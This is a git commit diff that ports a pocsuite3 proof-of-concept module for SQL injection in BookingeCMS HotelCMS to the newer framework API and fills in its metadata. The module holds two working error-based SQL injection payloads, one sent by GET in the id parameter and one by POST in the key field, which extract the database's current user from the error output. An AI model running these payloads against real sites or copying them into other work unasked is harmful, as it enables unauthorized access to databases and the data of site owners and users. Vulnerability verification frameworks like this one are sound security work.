b7fc21452fcf5501371114baf12741bfcd6f278b
dmknght <dmknghtx2team@gmail.com>
2019-08-23 14:43:47 +0700

    add info

--- pocsuite3/pocs/bookingeCMS_sql_injection.py
+++ pocsuite3/pocs/bookingeCMS_sql_injection.py
@@ -2,22 +2,21 @@
 
 # coding: utf-8
 import re
-from pocsuite.api.request import req
-from pocsuite.api.poc import register
-from pocsuite.api.poc import Output, POCBase
+
+from pocsuite3.api import Output, POCBase, register_poc, requests
 
 
 class TestPOC(POCBase):
-	vulID = ''  # ssvid
-	version = '1.0'
-	author = ['kenan']
-	vulDate = ''
+	vulID = 'SSV:91873'  # ssvid
+	version = '2.0'
+	author = ['kenan', "dmknght"]
+	vulDate = '2016-06-06'
 	createDate = '2016-06-06'
 	updateDate = '2016-06-06'
 	references = ['http://www.seebug.org/vuldb/ssvid-']
-	name = ''
+	name = 'BookingeCMS HotelCMS SQL Injection'
 	appPowerLink = ''
-	appName = ''
+	appName = 'HotelCMS'
 	appVersion = ''
 	vulType = ''
 	desc = '''
@@ -30,12 +29,12 @@ class TestPOC(POCBase):
 		# Write your code here
 		vulurl = "%s" % self.url
 		payload = "/?m=info.detail&id=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e7e7e,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7e7e7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
-		resp = req.get(vulurl + payload)
+		resp = requests.get(vulurl + payload)
 		re_result = re.findall(r'~~~(.*?)~~~', resp.content, re.S | re.I)
 		vulurl1 = "%s/?m=city.getSearch&index=xx" % self.url
 		payload1 = {
 			"key": "xxx' AND (SELECT 7359 FROM(SELECT COUNT(*),CONCAT(0x7e7e7e,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7e7e7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xx'='xx"}
-		resp1 = req.post(vulurl, data = payload1)
+		resp1 = requests.post(vulurl, data = payload1)
 		re_result1 = re.findall(r'~~~(.*?)~~~', resp1.content, re.S | re.I)
 		if re_result:
 			result['VerifyInfo'] = {}
@@ -62,4 +61,4 @@ class TestPOC(POCBase):
 		return output
 
 
-register(TestPOC)
+register_poc(TestPOC)
